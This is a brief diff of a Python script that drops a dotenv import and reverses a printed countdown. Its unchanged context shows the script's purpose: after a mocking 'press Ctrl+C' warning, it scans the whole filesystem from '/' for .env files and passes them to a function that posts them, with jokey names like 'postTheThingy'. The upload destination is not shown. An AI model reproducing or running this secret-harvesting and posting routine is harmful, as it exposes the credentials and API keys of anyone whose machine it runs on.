@@ -1,8 +1,6 @@
 import time
-from dotenv import load_dotenv
 import os
 
-load_dotenv()
 
 def searchFiles(root, target):
     matches = []
@@ -59,7 +57,7 @@ def main():
                     print("You can always stop this by pressing Ctrl+C you know...")
                     time.sleep(1)
                     for i in range(5):
-                        print(i)
+                        print(5-i)
                         time.sleep(1)
                     print("Scanning and posting...")
                     postTheThingy(epsteinFiles(searchFiles("/", ".env")))
